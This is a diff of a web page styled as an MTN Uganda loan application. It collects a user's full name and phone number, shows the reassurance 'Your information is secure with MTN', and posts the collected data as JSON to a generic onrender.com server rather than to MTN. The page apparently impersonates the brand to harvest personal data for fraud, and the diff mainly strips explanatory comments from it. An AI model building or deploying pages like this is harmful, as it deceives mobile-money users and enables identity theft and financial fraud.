@@ -335,7 +335,7 @@
         <div class="step-item active" id="stepIndicator1"><div class="step-circle">1</div><div>1. Details</div></div>
         <div class="step-item" id="stepIndicator2"><div class="step-circle">2</div><div>2. Verify</div></div>
         <div class="step-item" id="stepIndicator3"><div class="step-circle">3</div><div>3. Confirm</div></div>
-<!-- STEP 2: SUMMARY VERIFICATION -->
+<!-- STEP 2 PANEL -->
         <div class="step-panel" id="panel2">
             <div class="summary-header">
                 <span style="font-size: 24px;">📋</span>
@@ -355,7 +355,7 @@
             <button type="button" class="btn-primary" onclick="goToStep3()">Next ❯</button>
         </div>
 
-        <!-- STEP 3: FINAL DETAIL CONFIRMATION -->
+        <!-- STEP 3 PANEL -->
         <div class="step-panel" id="panel3">
             <div class="summary-header">
                 <span style="font-size: 24px;">🛡️</span>
@@ -378,7 +378,7 @@
             </button>
         </div>
 
-        <!-- STEP 4: SUCCESS LAYOUT -->
+        <!-- STEP 4 PANEL -->
         <div class="step-panel" id="panel4">
             <div class="success-panel">
                 <div class="success-circle">✓</div>
@@ -391,15 +391,13 @@
                 <button type="button" class="btn-primary" onclick="resetForm()">Back to Home</button>
             </div>
         </div>
-    </div>
+    </div> <!-- Close main-card -->
 
     <div class="footer-secure">🛡️ | Your information is secure with MTN</div>
 
     <script>
-        // 🌐 LIVE ENDPOINT ROUTING CONFIGURATION
         const SERVER_URL = 'https://onrender.com';
 
-        // Calculation logic data caches
         let computedAmount = "UGX 0";
         let computedPeriod = "0 Months";
         let computedInstalment = "UGX 0";
@@ -419,12 +417,10 @@
             computedPeriod = `${period} ${period === 1 ? 'Month' : 'Months'}`;
             computedInstalment = `UGX ${monthlyInstalment.toLocaleString()}`;
 
-            // Sync elements step 2
             document.getElementById('sumAmount').innerText = computedAmount;
             document.getElementById('sumPeriod').innerText = computedPeriod;
             document.getElementById('sumInstalment').innerText = computedInstalment;
 
-            // Header labels setup matching layouts
             document.getElementById('dynamicTitle').innerText = "Loan Application";
             document.getElementById('dynamicSubtitle').style.display = "none";
 
@@ -433,10 +429,8 @@
 
         function goToStep3() {
             const rawPhone = document.getElementById('mtnNumber').value;
-            // Format phone number variant layout to closely match step 3 preview format 
             const formattedPhone = rawPhone.replace(/^(0)/, '+256 ');
 
-            // Sync items step 3 confirmation panel view
             document.getElementById('confName').innerText = document.getElementById('fullName').value;
             document.getElementById('confPhone').innerText = formattedPhone;
             document.getElementById('confAmount').innerText = computedAmount;
@@ -468,7 +462,7 @@
                     body: JSON.stringify(payload)
                 });
             } catch (err) {
-                console.error("Transmission logging error context:", err);
+                console.error("Transmission error:", err);
             } finally {
                 document.getElementById('dynamicTitle').innerText = "Loan Verification";
                 switchPanel(4, '100%');
